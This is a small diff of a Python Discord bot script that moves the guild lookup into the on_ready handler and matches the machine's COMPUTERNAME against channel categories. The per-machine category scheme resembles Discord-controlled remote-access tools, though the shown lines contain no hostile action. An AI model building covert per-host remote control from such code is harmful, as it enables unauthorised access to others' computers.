@@ -27,7 +27,7 @@ serverID =  #Takes an integer
 
 webhook = discord.SyncWebhook.from_url(whURL)
 client = discord.Client(intents=intents)
-guild = client.get_guild(serverID)
+guild = ''
 
 hwid = ''
 
@@ -35,8 +35,10 @@ hwid = ''
 async def on_ready():
     first_run = True
     global hwid
+    global guild
     
     hwid = os.getenv("COMPUTERNAME")
+    guild = client.get_guild(serverID)
    
     for category_name in guild.categories:
         if hwid == str(category_name):
